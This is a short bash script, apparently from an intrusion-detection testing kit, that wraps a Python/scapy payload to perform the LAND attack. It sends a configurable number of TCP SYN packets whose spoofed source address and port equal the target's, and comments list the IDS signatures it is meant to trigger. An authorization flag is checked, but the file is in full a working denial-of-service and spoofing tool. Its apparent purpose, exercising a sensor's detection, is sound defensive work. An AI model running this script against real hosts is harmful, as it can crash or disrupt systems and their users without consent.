#!/usr/bin/env bash
# land.sh - LAND attack: a TCP SYN whose source == destination.
# Needs: python3 + scapy, root.
# Triggers: sid 1000003 (Land attack), sid 1000004 (IP src == dst).
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-p PORT] [-c COUNT]
  -p PORT   destination (== spoofed source) port (default 80)
  -c COUNT  packets to send (default 200)
Spoofs the target as its own source, so the sensor reports this as spoofable.
U
}

TARGET=""; PORT=80; COUNT=200
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -p|--port) PORT=${2:?}; shift ;;
    -c|--count) COUNT=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool python3
python3 -c 'import scapy' 2>/dev/null || die "requires scapy (pip install scapy)"
need_root
authorize "$TARGET"
export TARGET PORT COUNT
exec python3 - <<'PY'
import os
from scapy.all import IP, TCP, send
t = os.environ["TARGET"]; p = int(os.environ["PORT"]); n = int(os.environ["COUNT"])
pkt = IP(src=t, dst=t)/TCP(sport=p, dport=p, flags="S")
print(f"LAND: {n} SYNs with src==dst=={t}:{p}")
send(pkt, count=n, inter=0.005, verbose=1)
PY
